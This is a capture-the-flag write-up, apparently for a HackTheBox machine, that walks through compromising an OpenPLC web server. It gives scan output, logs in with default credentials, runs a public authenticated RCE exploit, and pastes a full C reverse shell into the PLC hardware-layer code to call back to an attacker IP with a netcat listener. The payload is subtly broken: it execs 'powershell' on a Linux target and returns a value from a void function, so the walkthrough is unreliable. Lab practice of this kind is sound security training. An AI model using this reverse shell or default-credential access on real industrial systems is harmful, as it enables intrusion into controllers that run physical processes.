# Reconnaissances
## Port Scanning
`$ sudo nmap -p- -sV -sC -T4 10.10.11.7`
```
Nmap scan report for wifinetictwo.htb (10.10.11.7)
Host is up (0.064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://wifinetictwo.htb:8080/login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zf-yrw.BArx7hkN5nDTHfeHACG9usD-plk; Expires=Sun, 24-Mar-2024 05:02:19 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Sun, 24 Mar 2024 04:57:19 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 219
|     location: http://0.0.0.0:8080/login
|     vary: Cookie
|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.Zf-yrw.-tGHUapYFTi_Smd8EHQ9lu294sk; Expires=Sun, 24-Mar-2024 05:02:19 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Sun, 24 Mar 2024 04:57:19 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     content-type: text/html; charset=utf-8
|     allow: HEAD, OPTIONS, GET
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zf-yrw.BArx7hkN5nDTHfeHACG9usD-plk; Expires=Sun, 24-Mar-2024 05:02:19 GMT; HttpOnly; Path=/
|     content-length: 0
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Sun, 24 Mar 2024 04:57:19 GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad request
|     content-length: 90
|     cache-control: no-cache
|     content-type: text/html
|     connection: close
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|_    </body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=3/24%Time=65FFB35E%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,24C,"HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/htm
SF:l;\x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\
SF:.0\.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZn
SF:Jlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.Zf-yrw\.-tGHUapYFTi_Smd8EHQ9l
SF:u294sk;\x20Expires=Sun,\x2024-Mar-2024\x2005:02:19\x20GMT;\x20HttpOnly;
SF:\x20Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x
SF:20Sun,\x2024\x20Mar\x202024\x2004:57:19\x20GMT\r\n\r\n<!DOCTYPE\x20HTML
SF:\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>Red
SF:irecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x2
SF:0be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20<a\x20hre
SF:f=\"/login\">/login</a>\.\x20\x20If\x20not\x20click\x20the\x20link\.")%
SF:r(HTTPOptions,14E,"HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html
SF:;\x20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Co
SF:okie\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.Zf-yrw\.BArx
SF:7hkN5nDTHfeHACG9usD-plk;\x20Expires=Sun,\x2024-Mar-2024\x2005:02:19\x20
SF:GMT;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkz
SF:eug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Sun,\x2024\x20Mar\x202024\x2
SF:004:57:19\x20GMT\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x2
SF:0request\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\ncont
SF:ent-type:\x20text/html\r\nconnection:\x20close\r\n\r\n<html><body><h1>4
SF:00\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20
SF:request\.\n</body></html>\n")%r(FourOhFourRequest,224,"HTTP/1\.0\x20404
SF:\x20NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\ncon
SF:tent-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcG
SF:VybWFuZW50Ijp0cnVlfQ\.Zf-yrw\.BArx7hkN5nDTHfeHACG9usD-plk;\x20Expires=S
SF:un,\x2024-Mar-2024\x2005:02:19\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver
SF::\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Sun,\x2024\x20Mar\
SF:x202024\x2004:57:19\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W
SF:3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</ti
SF:tle>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x
SF:20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\
SF:x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20aga
SF:in\.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.53 seconds
```

### Observe the HTTP
`$ echo "10.10.11.7 wifinetictwo.htb" | sudo tee -a /etc/hosts`
`$ firefox 10.10.11.7:8080`
```
Welcome to OpenPLC
```

Looking for `OpenPLC` default credentials
`$ git clone https://github.com/ihebski/DefaultCreds-cheat-sheet`
`$ cd DefaultCreds-cheat-sheet`
`$ pip3 install -r requirements.txt`
`$ ./creds search openplc`
```
+---------+----------+----------+
| Product | username | password |
+---------+----------+----------+
| openplc | openplc  | openplc  |
+---------+----------+----------+
```

Looking for `OpenPLC` exploit
`$ searchsploit openplc`
```
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenPLC 3 - Remote Code Execution (Authenticated)                                                                                  | python/webapps/49803.py
OpenPLC WebServer 3 - Denial of Service                                                                                            | multiple/dos/51746.txt
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results 
```

# Pre-Exploitation
`$ cp /usr/share/exploitdb/exploits/python/webapps/49803.py .`
`$ python3 49803.py`
```bash
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[+] Remote Code Execution on OpenPLC_v3 WebServer
[+] Specify an url target
[+] Example usage: exploit.py -u http://target-uri:8080 -l admin -p admin -i 192.168.1.54 -r 4444
```

Set Listeing port
```bash
$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
```

`$ python3 49803.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.14.24 -r 9001`
```bash
[+] Remote Code Execution on OpenPLC_v3 WebServer
[+] Checking if host http://10.10.11.7:8080 is Up...
[+] Host Up! ...
[+] Trying to authenticate with credentials openplc:openplc
[+] Login success!
[+] PLC program uploading... 
[+] Attempt to Code injection...
[+] Spawning Reverse Shell...
[+] Failed to receive connection :(
                                              
```

I don't get any shell from that exploit script. but seems like we can input any malicious code in this application menu http://10.10.11.7:8080/hardware

# Exploitation
Generate the reverse shell with https://www.revshells.com/, and it manually to http://10.10.11.7:8080/hardware then become like below.
```C
//-----------------------------------------------------------------------------
// DISCLAIMER: EDDITING THIS FILE CAN BREAK YOUR OPENPLC RUNTIME! IF YOU DON'T
// KNOW WHAT YOU'RE DOING, JUST DON'T DO IT. EDIT AT YOUR OWN RISK.
//
// PS: You can always restore original functionality if you broke something
// in here by clicking on the "Restore Original Code" button above.
//-----------------------------------------------------------------------------

//-----------------------------------------------------------------------------
// These are the ignored I/O vectors. If you want to override how OpenPLC
// handles a particular input or output, you must put them in the ignored
// vectors. For example, if you want to override %IX0.5, %IX0.6 and %IW3
// your vectors must be:
//     int ignored_bool_inputs[] = {5, 6}; //%IX0.5 and %IX0.6 ignored
//     int ignored_int_inputs[] = {3}; //%IW3 ignored
//
// Every I/O on the ignored vectors will be skipped by OpenPLC hardware layer
//-----------------------------------------------------------------------------
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

//-----------------------------------------------------------------------------
// This function is called by the main OpenPLC routine when it is initializing.
// Hardware initialization procedures for your custom layer should be here.
//-----------------------------------------------------------------------------
void initCustomLayer()
{
}

//-----------------------------------------------------------------------------
// This function is called by OpenPLC in a loop. Here the internal input
// buffers must be updated with the values you want. Make sure to use the mutex 
// bufferLock to protect access to the buffers on a threaded environment.
//-----------------------------------------------------------------------------
void updateCustomIn()
{
    // Example Code - Overwritting %IW3 with a fixed value
    // If you want to have %IW3 constantly reading a fixed value (for example, 53)
    // you must add %IW3 to the ignored vectors above, and then just insert this 
    // single line of code in this function:
    //     if (int_input[3] != NULL) *int_input[3] = 53;
}

//-----------------------------------------------------------------------------
// This function is called by OpenPLC in a loop. Here the internal output
// buffers must be updated with the values you want. Make sure to use the mutex 
// bufferLock to protect access to the buffers on a threaded environment.
//-----------------------------------------------------------------------------
void updateCustomOut()
{
    // Example Code - Sending %QW5 value over I2C
    // If you want to have %QW5 output to be sent over I2C instead of the
    // traditional output for your board, all you have to do is, first add
    // %QW5 to the ignored vectors, and then define a send_over_i2c()
    // function for your platform. Finally you can call send_over_i2c() to 
    // send your %QW5 value, like this:
    //     if (int_output[5] != NULL) send_over_i2c(*int_output[5]);
    //
    // Important observation: If your I2C pins are used by OpenPLC I/Os, you
    // must also add those I/Os to the ignored vectors, otherwise OpenPLC
    // will try to control your I2C pins and your I2C message won't work.
    int port = 9001;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.24");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"powershell", NULL};
    execvp("powershell", argv);

    return 0;       
}
```

Set Listeing port
```
$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
```
Then run the PLC from it's dashboard.

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ ^Z
$ stty raw -echo;fg              
$ export TERM=xterm
```